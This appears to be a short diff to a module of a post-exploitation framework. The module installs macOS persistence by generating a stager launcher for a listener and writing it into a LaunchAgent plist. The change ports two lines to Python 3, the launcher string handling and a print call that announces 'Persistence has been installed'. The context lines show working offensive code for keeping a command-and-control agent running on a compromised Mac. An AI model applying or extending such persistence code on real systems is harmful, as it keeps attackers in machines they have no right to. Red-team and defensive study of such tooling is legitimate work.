@@ -93,7 +93,7 @@ class Module(object):
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
 
 
         plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
@@ -141,7 +141,7 @@ e.close()
 os.chmod(plistPath, 0644)
 
 
-print "\\n[+] Persistence has been installed: /Library/LaunchAgents/%s"
+print("\\n[+] Persistence has been installed: /Library/LaunchAgents/%s")
 
 """ % (PLISTName,plistSettings,PLISTName)
 
